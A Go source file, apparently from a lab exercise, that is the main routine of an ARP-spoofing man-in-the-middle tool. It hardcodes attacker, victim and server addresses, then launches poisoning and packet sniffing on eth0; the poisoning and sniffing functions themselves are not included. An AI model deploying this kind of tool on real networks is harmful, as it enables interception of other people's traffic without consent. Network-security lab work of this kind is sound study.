package main

import (
	"context"
	"flag"
	"net"
	"os"
	"os/signal"
	"sync"

	"github.com/google/gopacket/pcap"
)

func createHandle(nameOfdevice string) *pcap.Handle {

	handle, err := pcap.OpenLive(nameOfdevice, 1600, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	}
	return handle
}

var wg sync.WaitGroup

func main() {
	typeToFilter := flag.String("f", "", "Type to filter ex: Arp")
	flag.Parse()

	// attaquant_ip := net.ParseIP("10.0.0.30")
	attaquant_mac, _ := net.ParseMAC("02:42:0a:00:00:0c")

	victime_ip := net.ParseIP("10.0.0.20")
	// victime_mac, _ := net.ParseMAC("02:42:0A:00:00:0B")

	serveur_ip := net.ParseIP("10.0.0.10")
	serveur_mac, _ := net.ParseMAC("02:42:0A:00:00:0A")

	ip_target := serveur_ip
	mac_target := serveur_mac
	ip_src := victime_ip
	mac_src := attaquant_mac

	// A decommenter apres pour faire les param par arg
	// -------------------------------------------------------
	// var ip_src string
	// var mac_src string
	// var ip_target string
	// var mac_target string

	// if !setup(&ip_src, &mac_src, &ip_target, &mac_target) {
	// 	return
	// }
	// -------------------------------------------------------
	handle := createHandle("eth0")
	defer handle.Close()

	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		c := make(chan os.Signal, 1)
		signal.Notify(c, os.Interrupt)
		<-c
		signal.Reset()
		cancel()
	}()

	go launchPoisoning(ip_src, mac_src, ip_target, mac_target, handle, ctx)

	// a decommenter apres pour lancer le sniffing
	// -------------------------------------------------------
	launchSniffing(*typeToFilter, handle)
	// -------------------------------------------------------

	// Block until a signal is received.
	// s := <-c
	// fmt.Println("Got signal:", s)
	// fmt.Println("ARP TABLE RESTAURATION:", s)

}
